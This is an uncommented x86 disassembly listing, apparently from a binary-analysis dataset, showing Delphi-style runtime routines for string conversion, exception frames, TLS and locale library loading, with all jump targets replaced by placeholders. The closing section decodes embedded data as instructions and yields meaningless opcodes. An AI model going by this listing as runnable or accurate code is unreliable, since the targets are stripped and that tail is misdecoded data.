lea edx [ eax + esi ]
add eax ebx
call sub_404bc4
mov eax 0x10
jmp r-xdata
cmp cl 0xd
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
lea edx [ eax + ebx ]
add eax esi
call sub_4028e0
xor ecx ecx
mov cl [ edx + 0x1 ]
push [ ecx + edx + 0x2 ]
push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404cf8
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404bdc
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_4056a4
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_40501c
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404cf8
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4040a4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40476c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404bc4
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404cf8
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404bdc
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4056a4
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_40501c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402840
sub_404df4
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e48
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404e40
jmp r-xdata
mov al 0x4
call sub_402840
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402840
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_402724
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026e4
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402ca4
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404acc
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028e0
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402ca4
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404e28
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404e48
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404fe0
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_402704
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404acc
sub_40501c
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404fe0
pop edx
pop eax
sub_405044
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012f4
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405074
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_401284
mov eax esp
mov dl 0x1
call sub_4052b0
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_4050bc
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405074
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_4050f8
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_40128c
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401294
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_4050e4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_4050e4
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_4050e4
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_401264
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_40125c
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_4052b0
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_401284
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4053b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_4050f8
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012dc
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012d4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012e4
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012dc
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_4012a4
push eax
call sub_40127c
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405550
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402704
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402704
jmp r-xdata
sub_4055b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4055eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_40561c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_405680
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4055b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405687
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4056a4
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4056d0
test edx edx
je sub_40568c
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402840
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405774
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call sub_40131c
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_40579c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405878
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4059b0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404050
mov eax ebx
xor edx edx
call sub_4048a8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a56
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax ebx
call sub_40489c
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_40469c
mov eax ebx
call sub_40489c
push eax
mov eax [ ebp - 0x4 ]
call sub_404310
inc eax
push eax
mov eax ebx
call sub_40488c
push eax
mov eax [ ebp - 0x4 ]
call sub_404510
pop ecx
pop edx
call sub_40579c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404050
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_40469c
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4040a4
sub_405a5c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405af3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404730
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405afa
lea eax [ ebp - 0x4 ]
call sub_404730
retn
mov eax ebx
call sub_404310
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404978
mov eax ebx
call sub_404310
push eax
mov eax [ ebp - 0x4 ]
call sub_40489c
inc eax
push eax
mov eax ebx
call sub_404510
push eax
mov eax [ ebp - 0x4 ]
call sub_40488c
pop ecx
pop edx
call sub_405878
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404730
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404978
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40476c
sub_405b00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405b43
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_40487c
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4059b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405b4a
lea eax [ ebp - 0x4 ]
call sub_404730
retn
sub_405b50
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404248
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_4050bc
push eax
call sub_4012b4
mov ecx eax
mov edx esp
mov eax esi
call sub_404140
jmp r-xdata
sub_405ba8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405c0e
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40127c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4042c0
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402cc4
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c15
lea eax [ ebp - 0x10 ]
call sub_404050
retn
xor ebx ebx
sub_405c1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c66
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c6d
retn
mov eax rw-data
call sub_402b00
mov eax rw-data
call sub_402b00
mov eax rw-data
call sub_402b00
call sub_401ae8
sub_405c70
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404dec
call sub_4030dc
test al al
je r-xdata
call sub_4031d0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401334
mov [ rw-data ] eax
call sub_40132c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_40310c
call sub_4012a4
call sub_405ba8
mov [ rw-data ] eax
call sub_40132c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_4012a4
call sub_405ba8
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401324
mov [ rw-data ] eax
sub_405d78
push ebx
call sub_405d70
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405d64
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403fc0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403fc0
sub_405dbc
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405d78
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405e08
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405d44
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405dfc
mov edx rw-data
mov eax ebx
call sub_403d14
pop ebx
retn
sub_405e4c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e71
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e78
retn
sub_405ea8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405ec4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405ee9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ef0
retn
sub_405f0e
call [ eax + r-xdata ]
add eax [ edx ]
xor [ cs : 0x0 ] eax
or al 0x0
add [ eax ] al
adc [ edi + 0x40 ] bl
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
retn
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x6c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
retn
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx + 0x5825ffc0 ] cl
retn
ja DeleteFileA
or ch [ edi + 0x64 ]
